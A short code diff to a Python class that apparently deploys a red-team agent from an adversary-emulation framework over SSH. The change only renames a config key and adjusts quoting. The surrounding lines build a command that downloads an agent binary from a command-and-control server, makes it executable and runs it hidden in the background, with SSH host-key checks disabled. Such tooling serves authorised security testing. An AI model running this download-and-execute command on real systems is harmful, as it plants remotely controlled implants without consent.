@@ -8,12 +8,12 @@ class SSHSpawnAgent(LowLevelAction):
         self.ssh_ip = ssh_ip
         self.ssh_user = ssh_user
         self.ssh_port = ssh_port
-        server = ConfigService().get_config().c2c_server
+        server = ConfigService().get_config().agent_c2c_server
         remote_cmd = (
             f'agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" {server}/file/download '
             f'2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d= -f2 | tr -d "\\"\\r") '
-            f'&& chmod +x $agent 2>/dev/null; '
-            f'nohup ./$agent -server {server} -group red >/dev/null 2>&1 &'
+            f"&& chmod +x $agent 2>/dev/null; "
+            f"nohup ./$agent -server {server} -group red >/dev/null 2>&1 &"
         )
         command = (
             f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
